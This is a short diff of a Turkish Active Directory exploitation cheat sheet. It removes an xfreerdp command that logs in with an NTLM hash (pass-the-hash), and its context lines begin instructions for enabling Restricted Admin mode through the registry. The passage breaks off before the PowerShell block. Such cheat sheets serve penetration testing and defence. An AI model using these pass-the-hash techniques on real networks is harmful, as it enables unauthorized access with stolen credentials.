@@ -1,12 +1,5 @@
 # Active Directory Exploitation Cheat Sheet - Bölüm 4
 
-## xFreeRDP Kullanımı
-
-- **xFreeRDP Komutları:**  
-  ```
-  xfreerdp +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
-  ```
-
 - **Restricted Admin Modunu Etkinleştirme:**  
   Eğer uzak makinede Restricted Admin modu devre dışıysa, aşağıdaki kayıt anahtarını oluşturarak etkinleştirebilirsiniz:
   ```powershell
